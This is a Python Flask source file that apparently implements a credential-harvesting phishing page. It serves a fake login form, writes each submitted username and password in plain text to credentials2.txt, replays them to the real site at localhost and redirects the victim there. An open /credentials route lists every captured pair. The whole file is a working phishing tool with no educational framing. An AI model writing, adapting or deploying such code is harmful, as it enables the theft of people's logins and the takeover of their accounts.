from flask import Flask, render_template, request, redirect, url_for
import os
import requests
app = Flask(__name__)

@app.route('/')
def login():
    return render_template('login2.html')

@app.route('/submission', methods=['POST'])
def submission():
    username = request.form.get('username')
    password = request.form.get('password')

    with open('credentials2.txt', 'a') as f:
        f.write(f'{username} {password}\n')

    if 'submit' in request.form:
       payload = {
        'username': username,
        'password': password,
        'submit': 'submit'
        }
       requests.post('http://localhost/', payload)
       return redirect("http://localhost/", code=307)
    elif 'customPage' in request.form:
        return render_template('custom.html') 

@app.route('/credentials')
def credentials():
    if os.path.exists('credentials2.txt'):
        with open('credentials2.txt', 'r') as f:
            return f.read().split('\n')
    else:
        data = 'No credentials found yet.'
    return render_template('credentials2.html', data=data)

if __name__ == '__main__':
    app.run(debug=True)

